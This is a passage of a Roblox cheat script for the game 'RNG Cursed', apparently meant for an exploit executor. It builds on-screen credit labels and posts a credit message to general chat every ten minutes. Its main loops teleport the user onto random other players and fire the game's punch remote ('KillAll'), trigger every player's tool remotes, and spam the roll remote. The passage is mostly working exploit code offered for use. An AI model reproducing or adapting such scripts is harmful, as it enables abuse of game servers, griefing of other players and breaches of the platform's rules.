end)
-- ================== BOTTOM CREDITS (LEFT + CENTER + RIGHT - non-intrusive) ==================
local CreditsGui = Instance.new("ScreenGui")
CreditsGui.Name = "CreditsDisplay"
CreditsGui.ResetOnSpawn = false
CreditsGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
pcall(function() CreditsGui.Parent = CoreGui end)
-- Center (original)
local HintLabel = Instance.new("TextLabel")
HintLabel.Size = UDim2.new(1, 0, 0, 20)
HintLabel.Position = UDim2.new(0, 0, 1, -20)
HintLabel.BackgroundTransparency = 0.6
HintLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
HintLabel.Text = "RightShift / K to toggle UI"
HintLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
HintLabel.Font = Enum.Font.Gotham
HintLabel.TextSize = 10
HintLabel.TextXAlignment = Enum.TextXAlignment.Center
HintLabel.Parent = CreditsGui
-- Left credit
local LeftCreditLabel = Instance.new("TextLabel")
LeftCreditLabel.Size = UDim2.new(0, 190, 0, 20)
LeftCreditLabel.Position = UDim2.new(0, 12, 1, -22)
LeftCreditLabel.BackgroundTransparency = 0.75
LeftCreditLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
LeftCreditLabel.Text = "RNG Cursed • von & big head"
LeftCreditLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
LeftCreditLabel.Font = Enum.Font.Gotham
LeftCreditLabel.TextSize = 9
LeftCreditLabel.TextXAlignment = Enum.TextXAlignment.Left
LeftCreditLabel.Parent = CreditsGui
-- Right credit
local RightCreditLabel = Instance.new("TextLabel")
RightCreditLabel.Size = UDim2.new(0, 190, 0, 20)
RightCreditLabel.Position = UDim2.new(1, -202, 1, -22)
RightCreditLabel.BackgroundTransparency = 0.75
RightCreditLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
RightCreditLabel.Text = "von & big head • RNG Cursed"
RightCreditLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
RightCreditLabel.Font = Enum.Font.Gotham
RightCreditLabel.TextSize = 9
RightCreditLabel.TextXAlignment = Enum.TextXAlignment.Right
RightCreditLabel.Parent = CreditsGui
-- ================== PERIODIC CHAT MESSAGE ==================
task.spawn(function()
    while true do
        task.wait(600)
        local message = "made by big head credit to von"
        pcall(function()
            if TextChatService and TextChatService.TextChannels and TextChatService.TextChannels.RBXGeneral then
                TextChatService.TextChannels.RBXGeneral:SendAsync(message)
            else
                local chatRemote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") and ReplicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
                if chatRemote then
                    chatRemote:FireServer(message, "All")
                end
            end
        end)
    end
end)
-- ================== CORE LOOPS ==================
task.spawn(function()
    while task.wait() do
        local PunchRemote = ReplicatedStorage:FindFirstChild("MOne")
        if getgenv().KillAll and PunchRemote then
            local LocalPlayer = Players.LocalPlayer
            local Character = LocalPlayer and LocalPlayer.Character
            local HRP = Character and Character:FindFirstChild("HumanoidRootPart")
            if HRP then
                if getgenv().TargetPlayer == nil or not getgenv().TargetPlayer.Parent or not getgenv().TargetPlayer.Character then
                    local Plrs = Players:GetPlayers()
                    if #Plrs > 1 then
                        local PotentialTarget = Plrs[math.random(1, #Plrs)]
                        if PotentialTarget ~= LocalPlayer and PotentialTarget.Character then
                            getgenv().TargetPlayer = PotentialTarget
                        end
                    end
                end
                if getgenv().TargetPlayer and getgenv().TargetPlayer.Character then
                    local TChar = getgenv().TargetPlayer.Character
                    local THRP = TChar:FindFirstChild("HumanoidRootPart")
                    local THum = TChar:FindFirstChild("Humanoid")
                    if THRP and THum then
                        TargetLabel.Text = "TARGET: " .. getgenv().TargetPlayer.Name:upper()
                        HealthLabel.Text = "HEALTH: " .. math.floor(THum.Health) .. "/" .. math.floor(THum.MaxHealth)
                        HRP.CFrame = THRP.CFrame * CFrame.new(math.random(1, 3), 5, math.random(-5, 15)) * CFrame.Angles(math.rad(-90), 0, 0)
                        PunchRemote:FireServer()
                    end
                end
            end
        else
            TargetLabel.Text = "TARGET: DISABLED"
            HealthLabel.Text = "HEALTH: N/A"
        end
        if getgenv().AutoFireAllAbilities then
            for _, p in ipairs(Players:GetPlayers()) do
                for _, r in ipairs(p:GetDescendants()) do
                    if r:IsA("RemoteEvent") and r.Name == "UseToolEvent" then
                        pcall(function() r:FireServer() end)
                    end
                end
            end
        end
    end
end)
task.spawn(function()
    while task.wait(0.1) do
        local RollRemote = ReplicatedStorage:FindFirstChild("Roll")
        if getgenv().AutoRoll and RollRemote then
            pcall(function() RollRemote:FireServer() end)
        end
    end
end)
print("Script loaded. Use the ≡ button or RightControl/K to toggle UI.")
